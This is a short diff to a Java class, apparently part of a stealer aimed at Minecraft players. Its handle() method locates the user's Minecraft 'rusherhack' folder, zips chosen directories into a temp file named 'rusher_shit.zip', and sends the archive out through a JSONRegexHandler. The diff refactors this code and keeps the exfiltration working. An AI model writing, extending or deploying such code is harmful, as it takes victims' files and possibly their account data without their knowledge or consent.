@@ -19,7 +19,6 @@ public final class RusherData implements JSONObject {
 
     @Override
     public void handle() {
-        String mcFolder = FileSystemHelper.getMinecraftFolder();
         if (mcFolder == null || !Files.exists(Paths.get(mcFolder))) return;
 
         String rusherFolder = mcFolder + "rusherhack/";
@@ -36,7 +35,7 @@ public final class RusherData implements JSONObject {
             validFileDirs.add(new File(dir));
         }
 
-        String zipFile = System.getProperty("java.io.tmpdir") + FileSystemHelper.getSeparator() + "rusher_shit.zip";
+        String zipFile = System.getProperty("java.io.tmpdir") + sep + "rusher_shit.zip";
         FileSystemHelper.zip(zipFile, validFileDirs);
         JSONRegexHandler.send(new File(zipFile));
     }
